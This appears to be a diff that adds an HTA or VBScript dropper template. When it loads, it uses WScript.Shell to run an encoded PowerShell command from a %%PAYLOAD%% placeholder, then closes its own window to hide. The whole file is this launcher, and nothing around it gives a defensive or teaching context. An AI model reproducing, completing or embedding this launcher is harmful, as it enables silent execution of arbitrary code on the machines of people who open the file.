@@ -1,0 +1,11 @@
+<script language="VBScript">
+  Function DoStuff()
+    Dim wsh
+    Set wsh = CreateObject("Wscript.Shell")
+    wsh.run "powershell.exe -enc %%PAYLOAD%%"
+    Set wsh = Nothing
+  End Function
+
+  DoStuff
+  self.close
+</script>
